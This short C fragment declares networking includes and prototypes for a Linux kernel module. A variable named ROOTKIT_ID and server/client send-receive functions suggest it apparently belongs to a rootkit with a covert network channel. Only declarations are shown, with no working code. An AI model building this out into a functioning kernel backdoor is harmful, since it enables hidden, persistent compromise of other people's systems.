#include <linux/in.h>
#include <linux/inet.h>
#include <linux/socket.h>
#include <net/sock.h>


extern int BUFFER_SIZE; //size of buffers used
extern char ROOTKIT_ID[];


struct client_t client;
struct server_t server;
static int run_server(void *port);
static int remove_server(void);
static int net_send(void);
static int net_recv(void);

static int client_handler(void); //handles the client
